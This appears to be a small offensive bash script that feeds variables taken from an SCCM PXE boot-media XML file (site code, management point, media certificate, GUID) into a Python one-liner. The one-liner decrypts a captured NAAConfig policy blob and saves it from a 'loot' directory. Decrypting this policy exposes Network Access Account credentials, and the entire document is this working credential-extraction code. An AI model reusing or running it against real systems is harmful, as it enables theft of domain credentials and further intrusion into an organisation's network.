#!/usr/bin/env bash
set -euo pipefail

RAW="${RAW:-loot/NAAConfig.raw}"
OUT="${OUT:-loot/NAAConfig.xml}"
XML="${XML:-/home/chrisr/share/projects/skatt/loot/sccm/sccm.xml}"

echo "[*] Decrypting policy blob"
echo "    RAW=${RAW}"
echo "    XML=${XML}"
echo "    OUT=${OUT}"

RAW="${RAW}" OUT="${OUT}" XML="${XML}" python3 -c 'import os,xml.etree.ElementTree as ET;from lib.policy import PolicyRetriever as P;root=ET.fromstring(open(os.environ["XML"]).read().encode("utf-16-le"));g=root.find(".//var[@name=\"_SMSMediaGuid\"]").text;p=P(root.find(".//var[@name=\"SMSTSMP\"]").text,root.find(".//var[@name=\"_SMSTSSiteCode\"]").text,bytes.fromhex(root.find(".//var[@name=\"_SMSTSMediaPFX\"]").text),g[:31]);open(os.environ["OUT"],"w",encoding="utf-16-le").write(p._cms_decrypt(open(os.environ["RAW"],"rb").read()).decode("utf-16-le"))'

echo "[+] Wrote decrypted XML to ${OUT}"
